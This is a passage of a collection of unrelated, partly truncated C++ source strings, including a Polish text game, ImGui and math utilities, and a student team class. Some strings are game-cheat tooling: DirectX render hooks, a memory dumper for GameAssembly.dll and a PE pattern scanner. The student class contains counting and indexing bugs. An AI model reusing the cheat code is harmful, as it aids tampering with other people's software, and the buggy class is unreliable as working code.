przyjemnie\"<<endl;\r\n\t\t\tcin>>decyzja;\r\n\t\t\tif(decyzja == 1) poprawny = 1;\r\n\t\t\telse if(decyzja == 2) poprawny = 1;\r\n\t\t}\r\n\t\twhile(!poprawny);\r\n\t\tif(decyzja == 1)\r\n\t\t{\r\n\t\t\tcout<<\"Diego: By\u0142oby dla ciebie lepiej gdyby\u015b tego nie zrobi\u0142... A teraz precz!\"<<endl\r\n\t\t\t\t<<\"-----------------------\"<<endl;\r\n\t\t\tpogadane = 3;\r\n\t\t\tcin.ignore(); cin.ignore();\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tcout<<\"Diego: No... Tylko nie marud\u017a za d\u0142ugo\"<<endl\r\n\t\t\t\t<<\"---------------------------------------\"<<endl;\r\n\t\t\tpogadane = 1;\r\n\t\t\t\r\n\t\t\tcin.ignore(); cin.ignore();\r\n\t\t}\r\n\t}\r\n\telse if(pogadane == 1 && quest < 2)\r\n\t{\r\n\t\tcout<<\"Diego: Bierz sie do roboty albo dostaniesz kopa\"<<endl\r\n\t\t\t<<\"---------------------------------------\"<<endl;\r\n\t\tcin.ignore();\r\n\t}\r\n\telse if(pogadane == 1 && quest >=2)\r\n\t{\r\n\t\tcout<<\"Diego: Dobra robota... Zaczynasz mi si\u0119 naprawd\u0119 podoba\u0107 ;)\"<<endl;\r\n\t\tPlaySound(\"INFO_DIEGO_BRINGLIST_SUCCESS_11_01.wav\", NULL, SND_ASYNC);\r\n\t\tcin.ignore(); \r\n\t\texpienie(wja, work2);\r\n\t\tcin.ignore();\r\n\t\tpogadane = 3;\r\n\t\tzrobione = 1;\r\n\t\tcout<<\"---------------------------------------\"<<endl;\r\n\t}\r\n\telse \r\n\t{\r\n\t\tcout<<\"Diego: Odejd\u017a... Nie wolno ci ze mn\u0105 rozmawia\u0107\"<<endl;\r\n\t\tcout<<\"---------------------------------------\"<<endl;\r\n\t\tcin.ignore();\r\n\t}\r\n}\r\n",
    "#include \"fmt_eigen.h\"\n#include \"fmt/color.h\"\nint main() {\n    Eigen::Matrix<double, 2, 2> matrix;\n    matrix << 1.234567, 2.345678, 3.456789, 4.567890;\n\n    Eigen::Matrix<double, 2, 2> transposed = matrix.transpose();\n    Eigen::Vector3d vec(1, 2, 3);\n\n    fmt::print(\"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(\"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec); // Specify precision of 4\n\n    fmt::print(\"Matrix Transposed:\\n{:.4f}\\n\", transposed); // Specify precision of 4\n    fmt::print(\"Matrix col or row:\\n{:.4f}\\n\", matrix.col(0)); // Specify precision of 4\n    fmt::print(\"Matrix Bolck:\\n{}\\n\", matrix.block<1,1>(0,0)); // Specify precision of 4\n    fmt::print(\"Matrix Diagonal:\\n{}\\n\", matrix.diagonal()); // Specify precision of 4\n\n    fmt::print(fg(fmt::color::steel_blue), \"Matrix:\\n{}\\n vector:\\n{}\\n\", matrix, vec);\n    fmt::print(bg(fmt::color::lime_green)|fg(fmt::color::indian_red),\n               \"Matrix:\\n{0:.3f}\\n vector:\\n{1:.4f}\\n\", matrix, vec);\n    fmt::print(fg(fmt::color::gold)|fmt::emphasis::blink, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n    fmt::print(fg(fmt::color::steel_blue)|fmt::emphasis::bold, \"Matrix Transposed:\\n{:.4f}\\n\", transposed);\n\n    getchar();\n    return 0;\n}\n",
    "\ufeff#include \"Renderer.h\"\n\n#include \"backends/imgui_impl_dx11.h\"\n#pragma comment(lib, \"dxgi\")\n#include \"backends/imgui_impl_dx12.h\"\n\n#include \"backends/imgui_impl_win32.h\"\n\n#include \"Backend/DX11Hook.h\"\n#include \"Backend/DX12Hook.h\"\n#include \"Utils.h\"\n#include \"Gui/gui.h\"\n#include \"Gui/fonts/DejaVuSansMono.hpp\"\n#include \"Gui/fonts/cousine.hpp\"\n#include \"Gui/fonts/Rubik.hpp\"\n\nnamespace Renderer\n{\n#pragma region DX11\n\n\tID3D11RenderTargetView* mainRenderTargetView;\n\n\tvoid OnInitDX11(HWND hWnd, ID3D11Device* pDevice, ID3D11DeviceContext* pContext, IDXGISwapChain* pSwapChain)\n\t{\n\t\tImGui::CreateContext();\n\t\tImGuiIO& io = ImGui::GetIO(); (void)io;\n\t\tImFontConfig fontConfig;\n\t\tio.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;\n\t\tio.ImeWindowHandle = hWnd;\n\t\tio.Fonts->AddFontFromMemoryCompressedTTF(Rubik_compressed_data, *Rubik_compressed_data, 15.0f, &fontConfig);\n\n\t\tImGui_ImplWin32_Init(hWnd);\n\t\tImGui_ImplDX11_Init(pDevice, pContext);\n\n\t\tID3D11Texture2D* pBackBuffer;\n\t\tpSwapChain->GetBuffer(0, __uuidof(ID3D11Texture2D), reinterpret_cast<LPVOID*>(&pBackBuffer));\n\t\tpDevice->CreateRenderTargetView(pBackBuffer, nullptr, &mainRenderTargetView);\n\t\tpBackBuffer->Release();\n\n\t\tio.SetPlatformImeDataFn = nullptr;\n\t}\n\n\tvoid OnRenderDX11(ID3D11DeviceContext* pContext)\n\t{\n\t\tauto& gui = Gui::GetInstance();\n\t\tImGui_ImplDX11_NewFrame();\n\t\tImGui_ImplWin32_NewFrame();\n\n\t\tImGui::NewFrame();\n\t\tInitTheme();\n\n\t\tif (gui.IsOpen())\n\t\t\tgui.Render();\n\n\t\t// TODO: Key Rebind\n\t\tif (Utils::KeyPressed(VK_INSERT))\n\t\t\tgui.Toggle();\n\n\t\tImGui::EndFrame();\n\t\tImGui::Render();\n\n\t\tpContext->OMSetRenderTargets(1, &mainRenderTargetView, nullptr);\n\t\tImGui_ImplDX11_RenderDrawData(ImGui::GetDrawData());\n\t}\n\n#pragma endregion\n\n#pragma region DX12\n\n\tvoid OnInitDX12(HWND hWnd, ID3D12Device* pDevice, UINT buffferCount, ID3D12DescriptorHeap* pDescriptorHeap)\n\t{\n\t\tImGui::CreateContext();\n\t\tImGuiIO& io = ImGui::GetIO(); (void)io;\n\t\tImFontConfig fontConfig;\n\t\tio.ConfigFlags |= ImGuiConfigFlags_NavEnableKeyboard;\n\t\tio.ImeWindowHandle = hWnd;\n\n\n\t\tImGui_ImplWin32_Init(hWnd);\n\t\tImGui_ImplDX12_Init(pDevice, buffferCount, DXGI_FORMAT_R8G8B8A8_UNORM, pDescriptorHeap, pDescriptorHeap->GetCPUDescriptorHandleForHeapStart(), pDescriptorHeap->GetGPUDescriptorHandleForHeapStart());\n\t\tImGui_ImplDX12_CreateDeviceObjects();\n\t}\n\n\tvoid OnPreRenderDX12()\n\t{\n\t\tImGui_ImplDX12_NewFrame();\n\t\tImGui_ImplWin32_NewFrame();\n\n\t\tImGui::NewFrame();\n\t\tInitTheme();\n\n\t\tImGui::Render();\n\t}\n\n\tvoid OnPostRenderDX12(ID3D12GraphicsCommandList* pCommandList)\n\t{\n\t\tImGui_ImplDX12_RenderDrawData(ImGui::GetDrawData(), pCommandList);\n\t}\n\n#pragma endregion\n\n\tvoid Init(DXVersion version)\n\t{\n\t\tswitch (version)\n\t\t{\n\t\tcase DXVersion::D3D11:\n\t\t\tBackend::DX11Hook::GetInstance()->OnInit = [](HWND hWnd, ID3D11Device* pDevice, ID3D11DeviceContext* pContext, IDXGISwapChain* pSwapChain) {\n\t\t\t\tOnInitDX11(hWnd, pDevice, pContext, pSwapChain);\n\t\t\t};\n\n\t\t\tBackend::DX11Hook::GetInstance()->OnRender = [](ID3D11DeviceContext* pContext) {\n\t\t\t\tOnRenderDX11(pContext);\n\t\t\t};\n\n\t\t\tBackend::DX11Hook::InitializeHooks();\n\t\t\tbreak;\n\t\tcase DXVersion::D3D12:\n\t\t\tBackend::DX12Hook::GetInstance()->OnInit = [](HWND hWnd, ID3D12Device* pDevice, UINT buffferCount, ID3D12DescriptorHeap* pDescriptorHeap) {\n\t\t\t\tOnInitDX12(hWnd, pDevice, buffferCount, pDescriptorHeap);\n\t\t\t};\n\n\t\t\tBackend::DX12Hook::GetInstance()->OnPreRender = []() {\n\t\t\t\tOnPreRenderDX12();\n\t\t\t};\n\n\t\t\tBackend::DX12Hook::GetInstance()->OnPostRender = [](ID3D12GraphicsCommandList* pCommandList) {\n\t\t\t\tOnPostRenderDX12(pCommandList);\n\t\t\t};\n\n\t\t\tBackend::DX12Hook::InitializeHooks();\n\t\t\tbreak;\n\t\t}\n\t}\n\n\tvoid InitTheme()\n\t{\n\t\tImGuiStyle& Style = ImGui::GetStyle();\n\t\tauto colors = Style.Colors;\n\t\tStyle.WindowPadding = ImVec2(10, 10);              // Padding within a window\n\t\tStyle.WindowMinSize = ImVec2(600, 420);            // Minimum window size\n\t\tStyle.WindowRounding = 5.0f;                       // Radius of window corners rounding. Set to 0.0f to have rectangular windows\n\t\tStyle.WindowTitleAlign = ImVec2(0.5f, 0.5f);       // Alignment for title bar text\n\t\tStyle.FramePadding = ImVec2(3, 3);                 // Padding within a framed rectangle (used by most widgets)\n\t\tStyle.FrameRounding = 4.0f;                        // Radius of frame corners rounding. Set to 0.0f to have rectangular frames (used by most widgets).\n\t\tStyle.ChildRounding = 1.0f;\n\t\tStyle.ItemSpacing = ImVec2(4, 4);                  // Horizontal and vertical spacing between widgets/lines\n\t\tStyle.ItemInnerSpacing = ImVec2(5, 5);             // Horizontal and vertical spacing between within elements of a composed widget (e.g. a slider and its label)\n\t\tStyle.TouchExtraPadding = ImVec2(0, 0);            // Expand reactive bounding box for touch-based system where touch position is not accurate enough. Unfortunately we don't sort widgets so priority on overlap will always be given to the first widget. So don't grow this too much!\n\t\tStyle.IndentSpacing = 20.0f;                       // Horizontal spacing when e.g. entering a tree node",
    "#include \"um.h\"\r\n#include \"json.h\"\r\n#include <fstream>\r\n\r\nusing nlohmann::json;\r\n\r\nint main( ) {\r\n    // Setup\r\n    cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_meth_setup();\r\n\r\n    // Get module\r\n    auto game_assembly = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_get_module(L\"GameAssembly.dll\");\r\n\r\n    // Read JSON input\r\n    std::ifstream input(\"json.txt\");\r\n    nlohmann::json crazy_swag;\r\n    input >> crazy_swag;\r\n    input.close();\r\n\r\n    // Open output file\r\n    std::ofstream output(\"material_output.txt\");\r\n\r\n    // Process each entry in the JSON\r\n    auto crazy_sneed = crazy_swag[\"CheatTable\"][\"CheatEntries\"][\"CheatEntry\"];\r\n    for (auto& entry : crazy_sneed) {\r\n        // Extract address\r\n        std::string addr_s = entry[\"Address\"];\r\n        unsigned long long crazy_value;\r\n        std::istringstream iss(addr_s);\r\n        iss >> std::hex >> crazy_value;\r\n        crazy_value -= 0x88;\r\n\r\n        // Read name\r\n        char material_name[255];\r\n        auto material_addy = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uintptr_t>(crazy_value + 0x30);\r\n        cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read(material_addy, material_name, 255);\r\n        material_name[254] = 0;\r\n        std::string name(material_name);\r\n\r\n        // Read key\r\n        auto material_address = cant_remove_due_to_strict_nda::crazy_material_dumper::crazy_read<uint32_t>(crazy_value + 0x8);\r\n\r\n        // Write to output file\r\n        output << \"material name: \" << name << \", material address: \" << material_address << \"\\n\";\r\n    }\r\n\r\n    // Close output file\r\n    output.close();\r\n\r\n    return 0;\r\n}",
    "#include <iostream>\n#include <string>\n#include <fstream>\n\nusing namespace std;\nclass Player {\nprivate:\n    string name;\n    int yearOfBirth;\n    int height;\n    int internationalGoals;\n    string nationality;\npublic:\n\n    //setters\n    void setName(string name){this->name = name;}\n    void setYearOfBirth(int yearOfBirth){this->yearOfBirth = yearOfBirth;}\n    void setHeight(int height){this->height = height;}\n    void setInternationalGoals(int internationalGoals){this->internationalGoals = internationalGoals;}\n    void setNationality(string nationality){this->nationality = nationality;}\n\n    //getters\n    string getName() const { return this->name;}\n    int getYearOfBirth() const  { return this->yearOfBirth;}\n    int getInternationalGoals() const {return this->internationalGoals;}\n    int getHeight(){return this->height;}\n\n    string getNationality() const {return this->nationality;}\n};\n\nclass NationalTeam {\nprivate:\n    string country;\n    Player players[18];\n    bool active[18];\n    int size;\npublic:\n    NationalTeam(string country = \" \") {\n        this->country = country;\n        size = 0;\n        for (int i = 0; i < 18; i++) active[i]=false;\n    }\n\n    bool addPlayer(const Player& player) {\n        if(this->size >= 18) return false;\n\n        this->players[this->size++] = player;\n        this->active[this->size++] = true;\n        return true;\n    }\n\n    bool removePlayer(string playerName) {\n        for (int i = 0; i < this->size; i++) {\n            if (players[i].getName() == playerName) {active[i] = false;return true;}\n            return false;\n        }\n    }\n\n    // to return total number of Players in the team\n    int getNumOfallPlayers() const {return this->size;}\n\n    // to return the average height of the team Players\n    int avgHeight() const {\n        int sum = 0;\n        for (int i = 0; i < this->size; i++) {sum+=players[i].getYearOfBirth();}\n        return sum/this->size;\n    }\n\n    // to return the oldest player object\n    Player oldestPlayer() const {\n        int oldestPlayer = players[0].getYearOfBirth();\n        int i;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getYearOfBirth() > oldestPlayer){oldestPlayer = players[i].getYearOfBirth();}\n        }return players[i];\n    }\n\n   // to return the youngest player object\n   Player youngestPlayer() const {\n        int youngestPlayer = players[0].getYearOfBirth();\n        int i;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getYearOfBirth() < youngestPlayer){youngestPlayer = players[i].getYearOfBirth();}\n        }return players[i];\n    }\n\n   // to return the average number of international goals per player in the team\n   int avgIntGoals() const {\n        int sum = 0;\n        for (int i = 0; i < this->size; i++) {sum+=players[i].getInternationalGoals();}\n        return sum/this->size;\n    }\n\n   // to return the player with the highest number of international goals\n   Player highestIntGoals() const {\n        int highestIntGoals = players[0].getInternationalGoals();\n        int i = 1;\n        for (i = 1; i < this->size; i++) {\n            if (players[i].getInternationalGoals() > highestIntGoals){highestIntGoals = players[i].getInternationalGoals();}\n        }return players[i];\n    }\n\n    string getCountry() const{return this->country;}\n\n    // to output a team\u2019s country and its allPlayers info.\n    friend ostream &operator<<( ostream &output, NationalTeam &team) {\n        output << \"team\u2019s country : \" << team.getCountry();\n        for (int i = 0 ; i < team.getNumOfallPlayers(); i++) {\n            output << \"player #\" << i+1 << \": \" << endl;\n            output << \"name: \" << team.players[i].getName() << endl;\n            output << \"get year of birth: \" << team.players[i].getYearOfBirth() << endl;\n            output << \"height: \" << team.players[i].getHeight() << endl;\n            output << \"international goals: \" << team.players[i].getInternationalGoals() << endl;\n            output << \"nationality: \" << team.players[i].getNationality() << endl;\n        }\n        return output;\n    }\n};\n\n\nPlayer* readallPlayersFromFile(ifstream& allPlayersInfo, Player *allPlayers, int size) {\n    string strInfo; int intInfo, index = 0; Player player;\n\n    allPlayers = new Player[size];\n\n    while (getline(allPlayersInfo, strInfo)) {\n        if(index >= size){break;}\n        player.setName(strInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setYearOfBirth(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setHeight(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        intInfo = stoi(strInfo);\n        player.setInternationalGoals(intInfo);\n\n        getline(allPlayersInfo, strInfo);\n        player.setNationality(strInfo);\n\n        // to ignor sprated space in the file\n        getline(allPlayersInfo, strInfo);\n\n        allPlayers[index++] = player;\n    }\n    allPlayersInfo.close();\n    return allPlayers;\n}\n\nvoid writeS",
    "#include \"Scanner.h\"\r\n\r\nvoid* PatternScan(void* module, const char* signature){\r\n    static auto pattern_to_byte = [](const char* pattern) {\r\n        auto bytes = std::vector<int>{};\r\n        auto start = const_cast<char*>(pattern);\r\n        auto end = const_cast<char*>(pattern) + strlen(pattern);\r\n\r\n        for (auto current = start; current < end; ++current) {\r\n            if (*current == '?') {\r\n                ++current;\r\n                if (*current == '?')\r\n                    ++current;\r\n                bytes.push_back(-1);\r\n            }\r\n            else {\r\n                bytes.push_back(strtoul(current, &current, 16));\r\n            }\r\n        }\r\n        return bytes;\r\n    };\r\n\r\n    auto dosHeader = (PIMAGE_DOS_HEADER)module;\r\n    auto ntHeaders = (PIMAGE_NT_HEADERS)((std::uint8_t*)module + dosHeader->e_lfanew);\r\n\r\n    auto sizeOfImage = ntHeaders->OptionalHeader.SizeOfImage;\r\n    auto patternBytes = pattern_to_byte(signature);\r\n    auto scanBytes = reinterpret_cast<std::uint8_t*>(module);\r\n\r\n    auto s = patternBytes.size();\r\n    auto d = patternBytes.data();\r\n\r\n    for (auto i = 0ul; i < sizeOfImage - s; ++i) {\r\n        bool found = true;\r\n        for (auto j = 0ul; j < s; ++j) {\r\n            if (scanBytes[i + j] != d[j] && d[j] != -1) {\r\n                found = false;\r\n                break;\r\n            }\r\n        }\r\n        if (found) {\r\n            return &scanBytes[i];\r\n        }\r\n    }\r\n    return nullptr;\r\n}",
    "#include <iostream>\n#include <iomanip>\n#include <utility>\n#include <string>\n#include \"ProteinDatabase.h\"\n#include \"ProteinDatabase.h\" // intentional\n#include \"TimedTask.h\"\n#include \"TimedTask.h\" // intentional\n\nint cout = 0; // won't compile if headers don't follow convention regarding namespaces\n\nint main(int argc, char** argv)\n{\n\tstd::cout << \"Command Line:\\n\";\n\tstd::cout << \"--------------------------\\n\";\n\tfor (int i = 0; i < argc; ++i)\n\t\tstd::cout << std::setw(3) << i + 1 << \": \" << argv[i] << '\\n';\n\tstd::cout << \"--------------------------\\n\\n\";\n\n\tif (argc == 1)\n\t{\n\t\tstd::cerr << \"ERROR: Missing file name!\\n\";\n\t\treturn 1;\n\t}\n\telse if (argc != 2)\n\t{\n\t\tstd::cerr << \"ERROR: Too many arguments!\\n\";\n\t\treturn 2;\n\t}\n\n\tseneca::TimedTask t;\n\t{\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBA;\n\t\tt.stopClock();\n\t\tt.addTask(\"  0-arg Constructor\");\n\t\tstd::cout << \"  0-arg Constructor - protein_DBA.size = \"\n\t\t\t<< std::setw(7) << protein_DBA.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String     1: [\" << protein_DBA[  0] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String   100: [\" << protein_DBA[ 99] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  1000: [\" << protein_DBA[999] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  last: [\" << protein_DBA[protein_DBA.size() - 1] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String last+: [\" << protein_DBA[protein_DBA.size()] << \"]\\n\\n\";\n\n\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBB(argv[1]);\n\t\tt.stopClock();\n\t\tt.addTask(\"  1-arg Constructor\");\n\t\tauto cnt = protein_DBB.size();\n\t\tstd::cout << \"  1-arg Constructor - protein_DBB.size = \"\n\t\t          << std::setw(7) << cnt << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String     1: [\"\n\t\t          << protein_DBB[  0].size()                               << \"][\"\n\t\t          << protein_DBB[  0].substr(0, 20)                        << \"][\"\n\t\t          << protein_DBB[  0].substr(protein_DBB[  0].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String   100: [\"\n\t\t          << protein_DBB[ 99].size()                               << \"][\"\n\t\t          << protein_DBB[ 99].substr(0, 20)                        << \"][\"\n\t\t          << protein_DBB[ 99].substr(protein_DBB[ 99].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String  1000: [\"\n\t\t          << protein_DBB[999].size()                               << \"][\"\n\t\t          << protein_DBB[999].substr(0, 20)                        << \"][\"\n\t\t          << protein_DBB[999].substr(protein_DBB[999].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String  last: [\"\n\t\t          << protein_DBB[cnt - 1].size()                           << \"][\"\n\t\t          << protein_DBB[cnt - 1].substr(0, 20)                    << \"][\"\n\t\t          << protein_DBB[cnt - 1].substr(protein_DBB[cnt - 1].size() - 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(b) String last+: [\" << protein_DBB[protein_DBB.size()] << \"]\\n\\n\";\n\n\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBC{ protein_DBB };\n\t\tt.stopClock();\n\t\tt.addTask(\"  Copy Constructor\");\n\t\tstd::cout << \"  Copy Constructor  - protein_DBC.size = \"\n\t\t\t<< std::setw(7) << protein_DBC.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String     1: [\" << protein_DBC[0].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String   100: [\" << protein_DBC[99].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String  1000: [\" << protein_DBC[999].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String  last: [\" << protein_DBC[protein_DBC.size() - 1].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(c) String last+: [\" << protein_DBC[protein_DBC.size()] << \"]\\n\\n\";\n\n\n\t\tt.startClock();\n\t\tprotein_DBA = protein_DBB;\n\t\tt.stopClock();\n\t\tt.addTask(\"  Copy Assignment\");\n\t\tstd::cout << \"  Copy Assignment   - protein_DBA.size = \"\n\t\t\t<< std::setw(7) << protein_DBA.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String     1: [\" << protein_DBA[0].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String   100: [\" << protein_DBA[99].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  1000: [\" << protein_DBA[999].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  last: [\" << protein_DBA[protein_DBA.size() - 1].substr(0, 20) << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String last+: [\" << protein_DBA[protein_DBA.size()] << \"]\\n\\n\";\n\t\t\n\t\t\n\t\tprotein_DBA = protein_DBA;\n\n\t\tt.startClock();\n\t\tseneca::ProteinDatabase protein_DBD = std::move(protein_DBA);\n\t\tt.stopClock();\n\t\tt.addTask(\"  Move Constructor\");\n\t\tstd::cout << \"  Move Constructor  - protein_DBD.size = \"\n\t\t\t<< std::setw(7) << protein_DBD.size() << \" strings -> \\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String     1: [\" << protein_DBA[0] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String   100: [\" << protein_DBA[99] << \"]\\n\";\n\t\tstd::cout << std::setw(70) << \"(a) String  1000: [\" << protein_DBA[999] << \"]\\n\";\n\t\tstd::cout",
    "#ifndef IMGUI_DEFINE_MATH_OPERATORS\n#define IMGUI_DEFINE_MATH_OPERATORS\n#endif\n\n#include <unordered_map>\n\n#include \"tile.hpp\"\n\n#include \"common.hpp\"\n\n// TODO: support boundless space...\n\nusing clockT = std::chrono::steady_clock;\n\n[[nodiscard]] static ImTextureID make_screen(const aniso::tileT& tile) {\n    return make_screen(tile.width(), tile.height(), [&tile](int y) { return tile.line(y); });\n}\n\nstatic void zoom_image(ImTextureID texture, ImVec2 texture_size, ImVec2 region_center, ImVec2 region_size, int zoom) {\n    region_size = ImMin(texture_size, region_size);\n    const ImVec2 min_pos = ImClamp(region_center - ImFloor(region_size / 2), ImVec2(0, 0), texture_size - region_size);\n    const ImVec2 max_pos = min_pos + region_size;\n\n    ImGui::Image(texture, region_size * zoom, min_pos / texture_size, max_pos / texture_size);\n}\n\nstatic bool strobing(const aniso::ruleT& rule) {\n    constexpr aniso::codeT all_0{0}, all_1{511};\n    return rule[all_0] == 1 && rule[all_1] == 0;\n}\n\n// `tileT` is able to serve as the building block for boundless space (`tileT::gather` was\n// initially designed to enable this extension) but that's complicated, and torus space is enough to\n// show the effect of the rules.\nstatic void run_torus(aniso::tileT& tile, aniso::tileT& temp, const aniso::rule_like auto& rule) {\n    assert(&tile != &temp);\n\n    tile.gather_torus();\n    tile.apply_v2(rule, temp);\n    tile.swap(temp);\n}\n\n// Copy the subrange and run as a torus space, recording all invoked mappings.\n// This is good at capturing \"self-contained\" patterns (oscillators/spaceships).\nstatic aniso::moldT::lockT capture_closed(const aniso::tileT& source, const aniso::tileT::rangeT& range,\n                                          const aniso::ruleT& rule) {\n    aniso::tileT tile = aniso::copy(source, range);\n    aniso::tileT temp(tile.size());\n\n    aniso::moldT::lockT lock{};\n\n    // (wontfix) It's possible that the loop fails to catch all invocations in very rare cases,\n    // due to that `limit` is not large enough.\n\n    // Loop until there has been `limit` generations without newly invoked mappings.\n    const int limit = 120;\n    for (int g = limit; g > 0; --g) {\n        run_torus(tile, temp, [&](aniso::codeT code) {\n            if (!lock[code]) {\n                g = limit;\n                lock[code] = true;\n            }\n            return rule[code];\n        });\n    }\n\n    return lock;\n}\n\n// `capture_closed` is not suitable for capturing patterns that are not self-contained (what happens in the\n// copied subrange (treated as torus space) is not exactly what we see in the source space)\n// In these cases we need a way to record what actually happened in the range.\nstatic void capture_open(const aniso::tileT& source, aniso::tileT::rangeT range, aniso::moldT::lockT& lock) {\n    if (range.width() <= 2 || range.height() <= 2) {\n        return;\n    }\n    range.begin.x += 1;\n    range.begin.y += 1;\n    range.end.x -= 1;\n    range.end.y -= 1;\n    source.collect(range, lock);\n}\n\nclass densityT {\n    int m_dens; // \u2208 [0, 100], /= 100 to serve as density.\npublic:\n    densityT(double density) { m_dens = std::clamp(density, 0.0, 1.0) * 100; }\n\n    double get() const { return m_dens / 100.0; }\n    void step_slide(const char* label) {\n        imgui_StepSliderInt(label, &m_dens, 0, 100, std::format(\"{:.2f}\", m_dens / 100.0).c_str());\n    }\n\n    friend bool operator==(const densityT&, const densityT&) = default;\n};\n\nclass torusT {\n    aniso::tileT m_tile, m_temp;\n    int m_gen;\n\npublic:\n    struct initT {\n        aniso::tileT::sizeT size;\n        uint32_t seed;\n        densityT density;\n\n        friend bool operator==(const initT&, const initT&) = default;\n    };\n\n    explicit torusT(const initT& init) : m_tile(init.size), m_temp(init.size), m_gen(0) { restart(init); }\n\n    aniso::tileT& tile() { return m_tile; }\n    const aniso::tileT& tile() const { return m_tile; }\n    int gen() const { return m_gen; }\n\n    void restart(const initT& init) {\n        m_tile.resize(init.size);\n        m_temp.resize(init.size);\n\n        std::mt19937 rand(init.seed);\n        aniso::random_fill(m_tile, rand, init.density.get());\n\n        m_gen = 0;\n    }\n\n    void run(const aniso::ruleT& rule, int count = 1) {\n        for (int c = 0; c < count; ++c) {\n            run_torus(m_tile, m_temp, rule);\n            ++m_gen;\n        }\n    }\n\n    // (0, 0) is mapped to (wrap(dx), wrap(dy)).\n    void rotate(int dx, int dy) {\n        const int width = m_tile.width(), height = m_tile.height();\n\n        const auto wrap = [](int v, int r) { return ((v % r) + r) % r; };\n        dx = wrap(dx, width);\n        dy = wrap(dy, height);\n        assert(dx >= 0 && dx < width && dy >= 0 && dy < height);\n        if (dx == 0 && dy == 0) {\n            return;\n        }\n\n        [[maybe_unused]] const bool test = m_tile.line(0)[0];\n        m_temp.resize(m_tile.size());\n        for (int y = 0; y < height; ++y) {\n            const bool* source = m_tile.line(y);\n            bool* dest = m_temp.line((y",
    "// Copyright 2024 by Owen Bulka.\n// All rights reserved.\n// This file is released under the \"MIT License Agreement\".\n// Please see the LICENSE.md file that should have been included as part\n// of this package.\n\n\n//\n// Math operations\n//\n\n\n/**\n * Compute the fractional portion of the value. Ex. 3.5 returns 0.5\n *\n * @arg value: The value to get the fractional portion of.\n *\n * @returns: The fractional portion of the value.\n */\ninline float fract(const float value)\n{\n    return value - floor(value);\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline void matmul(const float4x4 &m, const float4 &v, float4 &out)\n{\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n}\n\n\n/**\n * Multiply a 4d vector by a 4x4 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float4 matmul(const float4x4 &m, const float4 &v)\n{\n    float4 out;\n    for (int i=0; i < 4; i++)\n    {\n        out[i] = 0;\n\n        for (int j=0; j < 4; j++)\n        {\n            out[i] += m[i][j] * v[j];\n        }\n    }\n\n    return out;\n}\n\n\n/**\n * Multiply a 3d vector by a 3x3 matrix.\n *\n * @arg m: The matrix that will transform the vector.\n * @arg v: The vector to transform.\n * @arg out: The location to store the resulting vector.\n */\ninline float3 matmul(const float3x3 &m, const float3 &v)\n{\n    return float3(\n        m[0][0] * v.x + m[0][1] * v.y + m[0][2] * v.z,\n        m[1][0] * v.x + m[1][1] * v.y + m[1][2] * v.z,\n        m[2][0] * v.x + m[2][1] * v.y + m[2][2] * v.z\n    );\n}\n\n\n/**\n * Convert the uv position in a latlong image to angles.\n *\n * @arg uvPosition: The UV position.\n *\n * @returns: The equivalent angles in radians.\n */\ninline float2 uvPositionToAngles(const float2 &uvPosition)\n{\n    return float2(\n        (uvPosition.x + 1.0f) * PI,\n        (1.0f - uvPosition.y) * PI / 2.0f\n    );\n}\n\n\n/**\n * Convert location of a pixel in an image into UV.\n *\n * @arg pixelLocation: The x, and y positions of the pixel.\n * @arg format: The image width, and height.\n *\n * @returns: The UV position.\n */\ninline float2 pixelsToUV(const float2 &pixelLocation, const float2 